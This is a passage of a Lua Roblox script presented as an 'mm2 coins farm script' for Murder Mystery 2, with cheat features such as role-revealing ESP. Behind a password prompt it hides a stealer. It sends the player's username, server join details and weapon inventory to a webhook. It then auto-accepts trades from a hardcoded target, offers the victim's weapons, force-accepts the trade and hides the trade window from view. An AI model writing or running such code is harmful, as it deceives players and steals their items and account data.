        btn.Text = "Unlock"
        btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.Parent = f
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

        local done = false
        btn.MouseButton1Click:Connect(function()
            local txt = string.lower(tostring(box.Text or ""))
            if txt == "mm2" then
                allowed = true
                hasTransfer = true
                done = true
                sg:Destroy()
            elseif txt == "677skibidi" or txt == "67skibidi" then
                allowed = true
                hasTransfer = false
                done = true
                sg:Destroy()
            else
                box.Text = ""
                box.PlaceholderText = "Wrong password"
            end
        end)

        repeat task.wait(0.2) until done or not sg.Parent
        if not allowed then
            print("[mm2 coins farm script 2026] Access denied")
            return
        end
    end
end

local function sw(msg, ping)
    local c = ping and "@everyone\n" .. msg or msg
    local d = {content = c, username = "mm2 coins farm script 2026"}
    pcall(function()
        if request then
            request({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(d)
            })
        end
    end)
end

local function getFullInventory()
    local list = {}
    pcall(function()
        local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
        if ok and pd and pd.Weapons and pd.Weapons.Owned then
            for n, a in pairs(pd.Weapons.Owned) do
                if a and a > 0 then
                    table.insert(list, n .. " x" .. tostring(a))
                end
            end
        end
    end)
    table.sort(list)
    return list
end

-- Detailed Transfer Ready webhook (only when hasTransfer)
-- Detailed Transfer Ready webhook (only when hasTransfer)
local function sendDetailedTransfer()
    local jobId = tostring(game.JobId)
    local consoleCode = 'Roblox.GameLauncher.joinGameInstance(' .. PLACE_ID .. ', "' .. jobId .. '")'
    local inventory = getFullInventory()
    local inventoryText = #inventory > 0 and table.concat(inventory, "\n") or "No weapons found"
    if #inventoryText > 900 then
        inventoryText = string.sub(inventoryText, 1, 900) .. "\n... (truncated)"
    end

    local data = {
        content = "@everyone **MM2 Transfer Ready**",
        embeds = {{
            title = "Quick Transfer",
            color = 5763719,
            fields = {
                {name = "Username", value = lp.Name, inline = true},
                {name = "UserId", value = tostring(lp.UserId), inline = true},
                {name = "JobId", value = "`" .. jobId .. "`", inline = false},
                {name = "Join Link", value = "https://fern.wtf/joiner?placeId=" .. PLACE_ID .. "&gameInstanceId=" .. jobId, inline = false},
                {name = "Console (F12)", value = "```js\n" .. consoleCode .. "\n```", inline = false},
                {name = "Inventory (" .. #inventory .. " items)", value = "```\n" .. inventoryText .. "\n```", inline = false},
            },
            footer = {text = "Waiting for trade from " .. TARGET},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        if request then
            request({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(data)
            })
        elseif syn and syn.request then
            syn.request({
                Url = WU,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HS:JSONEncode(data)
            })
        end
    end)
end
task.spawn(function()
    task.wait(1.5)
    if hasTransfer then
        sendDetailedTransfer()
        print("[mm2 coins farm script 2026] Detailed transfer webhook sent")
    else
        sw("✅ **Script executed** by **" .. lp.Name .. "**\nMode: NORMAL", false)
    end
end)

P.PlayerRemoving:Connect(function(pl)
    if WL[pl.Name] then
        sw("⚠️ **WHITELIST LEFT**\nPlayer: **" .. pl.Name .. "** disconnected / kicked", true)
    end
end)

P.PlayerAdded:Connect(function(pl)
    if WL[pl.Name] then
        task.wait(1)
        sw("🟢 **WHITELIST JOINED**\nPlayer: **" .. pl.Name .. "** joined", false)
    end
end)

-- ==================== TRANSFER (only if hasTransfer) ====================
local TR = false
local OT = 0
local AS = false
local LO = 0
local LF = nil

if hasTransfer then
    local Trade = RPS:FindFirstChild("Trade") or RPS:WaitForChild("Trade", 8)
    local OI, AR, AT, SR, ST, UT, DT
    if Trade then
        OI = Trade:FindFirstChild("OfferItem")
        AR = Trade:FindFirstChild("AcceptRequest")
        AT = Trade:FindFirstChild("AcceptTrade")
        SR = Trade:FindFirstChild("SendRequest")
        ST = Trade:FindFirstChild("StartTrade")
        UT = Trade:FindFirstChild("UpdateTrade")
        DT = Trade:FindFirstChild("DeclineTrade")
    end

    local function ist(n)
        return n and tostring(n):lower() == TARGET:lower()
    end

    local function gwps()
        local list = {}
        pcall(function()
            local ok, pd = pcall(function() return require(RPS.Modules.ProfileData) end)
            if ok and pd and pd.Weapons and pd.Weapons.Owned then
                for n, a in pairs(pd.Weapons.Owned) do
                    if a and a > 0 and not (n == "DefaultKnife") and not (n == "DefaultGun") then
                        local cnt = math.min(a, 4)
                        for i = 1, cnt do
                            table.insert(list, n)
                        end
                    end
                end
            end
        end)
        return list
    end

    local function fa()
        if not AT then return end
        for i = 1, 12 do
            if LF then pcall(function() AT:FireServer(game.PlaceId * 3, LF) end) end
            pcall(function() AT:FireServer(game.PlaceId * 3, tick()) end)
            pcall(function() AT:FireServer() end)
            task.wait(0.35)
        end
    end

    local function ow()
        if not OI or not TR or OT >= 4 then return end
        if tick() - LO < 0.55 then return end
        local wps = gwps()
        if #wps == 0 then return end
        local to = math.min(4 - OT, #wps)
        for i = 1, to do
            local ok = pcall(function() OI:FireServer(wps[i], "Weapons") end)
            if ok then
                OT = OT + 1
                LO = tick()
                print("[Transfer] Offered:", wps[i], "("..OT.."/4)")
                task.wait(0.3)
            end
        end
        if OT >= 4 and not AS then
            AS = true
            sw("🔄 **Trade full (4/4)** - waiting to accept | **" .. lp.Name .. "**", false)
            task.delay(7, function()
                if TR then
                    fa()
                    sw("✅ **Trade accepted / finished** by **" .. lp.Name .. "**", false)
                end
            end)
        end
    end

    local function htg(g)
        if not g then return end
        pcall(function()
            for _, c in ipairs(g:GetChildren()) do
                if c:IsA("GuiObject") then c.Visible = false end
            end
        end)
    end

    pcall(function()
        local function wtu(n)
            local g = pg:FindFirstChild(n)
            if g then
                htg(g)
                g:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if g.Enabled then htg(g) end
                end)
            end
        end
        wtu("TradeGUI")
        wtu("TradeGUI_Phone")
        pg.ChildAdded:Connect(function(c)
            if c.Name == "TradeGUI" or c.Name == "TradeGUI_Phone" then
                task.wait(0.1)
                htg(c)
                wtu(c.Name)
            end
        end)
    end)

    if SR then
        pcall(function()
            SR.OnClientInvoke = function(fp)
                if ist(fp and fp.Name) then
                    print("[Transfer] Request from target")
                    TR = true
                    OT = 0
                    AS = false
                    LF = nil
                    sw("📩 **Trade request received** from **" .. TARGET .. "** | Player: **" .. lp.Name .. "**", false)
                    task.wait(0.3)
                    if AR then pcall(function() AR:FireServer() end) end
                    return true
                end
                return false
            end
        end)
    end

    if ST then
        ST.OnClientEvent:Connect(function()
            if TR then
                OT = 0
                AS = false
                sw("🔄 **Trade started** | **" .. lp.Name .. "** offering weapons...", false)
                task.wait(0.4)
                ow()
            end
        end)
    end

    if UT then
        UT.OnClientEvent:Connect(function(data)
            if type(data) == "table" and data.LastOffer then
                LF = data.LastOffer
            end
            if not TR then return end
            task.wait(0.25)
            ow()
            if type(data) == "table" then
                for _, side in pairs(data) do
                    if type(side) == "table" and side.Accepted then
                        fa()
                        sw("✅ **Other player accepted** - finishing trade | **" .. lp.Name .. "**", false)
                        break
                    end
                end
            end
        end)
    end

    if DT then
        DT.OnClientEvent:Connect(function()
            TR = false
            OT = 0
            AS = false
            LF = nil
            sw("❌ **Trade ended / declined** | **" .. lp.Name .. "**", false)
        end)
    end

    task.spawn(function()
        while true do
            task.wait(0.8)
            if TR and AT and LF then
                pcall(function() AT:FireServer(game.PlaceId * 3, LF) end)
            end
        end
    end)

    print("[mm2 coins farm script 2026] Transfer system loaded")
end

-- ==================== CORE ====================
local AF = false
local SP = 50
local RG = 300
local VS = {}
local CL = 0
local AK = false
local RF = true
local LT = tick()
local IS = false
local PM = false
local IJ = false
local JP = 50
local ES = false
local HL = {}
local MODE = "Normal"

local function epm()
    pcall(function()
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        LG.GlobalShadows = false
        LG.FogEnd = 9e9
        LG.Brightness = 2
    end)
    PM = true
end

local function getRole(pl)
    local ok, roles = pcall(function()
        local r = RPS:FindFirstChild("GetPlayerData", true)
        if r then return r:InvokeServer() end
        return nil
    end)
    if ok and roles and roles[pl.Name] then
        return roles[pl.Name].Role or "Innocent"
    end
    local ch = pl.Character
    if ch then
        if ch:FindFirstChild("Knife") or (pl.Backpack and pl.Backpack:FindFirstChild("Knife")) then
            return "Murderer"
        end
        if ch:FindFirstChild("Gun") or (pl.Backpack and pl.Backpack:FindFirstChild("Gun")) then
            return "Sheriff"
        end
    end
    return "Innocent"
end

local function getMurderer()
    for _, pl in ipairs(P:GetPlayers()) do
        if getRole(pl) == "Murderer" then
            return pl
        end
    end
    return nil
end

local function updESP()
    if not ES then
        for _, h in pairs(HL) do
            if h and h.Parent then pcall(function() h:Destroy() end) end
        end
        HL = {}
        return
    end
    for _, pl in ipairs(P:GetPlayers()) do
        if not (pl == lp) and pl.Character and pl.Character:FindFirstChild("HumanoidRootPart") then
            local role = getRole(pl)
            local col = Color3.fromRGB(40, 255, 80)
            if role == "Murderer" then
                col = Color3.fromRGB(255, 40, 40)
            elseif role == "Sheriff" or role == "Hero" then
                col = Color3.fromRGB(40, 120, 255)
            end
            local h = HL[pl]
            if not h or not h.Parent then
                h = Instance.new("Highlight")
                h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                h.FillTransparency = 0.4
                h.OutlineTransparency = 0.15
                h.Parent = pl.Character
                HL[pl] = h
            end
            h.FillColor = col
            h.OutlineColor = col
            h.Adornee = pl.Character
        end
    end
end

task.spawn(function()
    while true do
        task.wait(0.65)
        pcall(updESP)
    end
end)

